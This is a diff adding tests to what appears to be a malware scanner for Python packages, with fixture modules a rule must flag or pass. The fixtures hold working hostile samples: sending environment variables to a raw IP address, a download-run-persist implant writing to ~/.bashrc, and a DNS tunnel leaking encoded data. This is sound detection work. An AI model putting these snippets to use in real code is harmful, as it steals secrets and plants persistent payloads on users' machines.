@@ -248,3 +248,59 @@ class TestADestinationOnlyWrittenAtImport:
             "urllib.request.urlopen('http://35.0.0.5:8000/c', json.dumps(dict(os.environ)).encode())\n"
         )
         assert "MALWARE.EXFIL.001" in self.rules(tmp_path, module)
+
+
+class TestAnImplantInstaller:
+    """trickery 1.0.0: one module fetches a payload, runs it and writes a persistence location,
+    reached only from a function. A downloader that only runs, or a tool that only writes a profile,
+    is not this."""
+
+    @staticmethod
+    def rules(tmp_path: Path, module: str) -> set[str]:
+        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)
+
+    def test_fetch_run_and_persist_in_one_module_blocks(self, tmp_path: Path) -> None:
+        module = (
+            "import os, subprocess, urllib.request\n"
+            "def attach(url):\n"
+            "    path = os.path.expanduser('~/.cache/agent')\n"
+            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
+            "    subprocess.Popen([path])\n"
+            "    with open(os.path.expanduser('~/.bashrc'), 'a') as rc:\n"
+            "        rc.write(path + ' &\\n')\n"
+        )
+        assert "MALWARE.IMPLANT.INSTALL.001" in self.rules(tmp_path, module)
+
+    def test_a_downloader_that_does_not_persist_does_not(self, tmp_path: Path) -> None:
+        module = (
+            "import os, subprocess, urllib.request\n"
+            "def install_tool(url):\n"
+            "    path = os.path.expanduser('~/.cache/tool')\n"
+            "    open(path, 'wb').write(urllib.request.urlopen(url).read())\n"
+            "    subprocess.run([path, '--version'])\n"
+        )
+        assert "MALWARE.IMPLANT.INSTALL.001" not in self.rules(tmp_path, module)
+
+
+class TestADnsTunnel:
+    @staticmethod
+    def rules(tmp_path: Path, module: str) -> set[str]:
+        return TestADestinationOnlyWrittenAtImport.rules(tmp_path, module)
+
+    def test_encoded_data_resolved_in_labels_blocks(self, tmp_path: Path) -> None:
+        module = (
+            "import base64, os, socket\n"
+            "def leak(data):\n"
+            "    blob = base64.b32encode(data.encode()).decode().rstrip('=')\n"
+            "    for i in range(0, len(blob), 60):\n"
+            "        socket.getaddrinfo(blob[i:i + 60] + '.t.example.invalid', 53)\n"
+        )
+        assert "MALWARE.EXFIL.DNS_TUNNEL.001" in self.rules(tmp_path, module)
+
+    def test_resolving_a_configured_host_does_not(self, tmp_path: Path) -> None:
+        module = (
+            "import os, socket\n"
+            "def reachable():\n"
+            "    return socket.getaddrinfo(os.environ.get('API_HOST', 'api.example.invalid'), 443)\n"
+        )
+        assert "MALWARE.EXFIL.DNS_TUNNEL.001" not in self.rules(tmp_path, module)
